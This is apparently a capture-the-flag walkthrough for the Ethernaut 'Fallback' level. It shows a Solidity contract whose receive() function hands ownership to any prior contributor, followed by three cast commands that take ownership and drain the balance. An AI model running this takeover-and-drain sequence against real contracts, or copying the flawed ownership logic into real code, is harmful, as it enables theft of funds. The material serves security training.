## Fallback Level Outline

**Difficulty : 1/10**

You will beat this level if:
1. you claim ownership of the contract
2. you reduce its balance to 0

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

## Solution

To become the contract owner, we first need to contribute some ETH and then call the fallback function.

### Walkthrough
##### 1. Contributing some eth by calling the "contribute()" function
```console
cast send $LEVEL_ADDRESS "contribute()" --value 0.0001ether --private-key=$PRIVATE_KEY
```

##### 2. Trigger the fallback function **receive()** by sending an eth transaction with an empty data field
```console
cast send $LEVEL_ADDRESS --value 0.0001ether --private-key $PRIVATE_KEY
```

##### 3. Draining the contract
```console
cast send $LEVEL_ADDRESS "withdraw()" --private-key $PRIVATE_KEY
```
## Further Reading

```
    Ether is sent to contract?
                |
        is msg.data empty?
                / \
               /   \
             yes    no  
             /       \    
        receive()    fallback()
         exist?                      
        /     \
       yes     no          
      /         \
  receive()     fallback()
```

---

##### [:arrow_left: Back To Main Menu](../README.md)
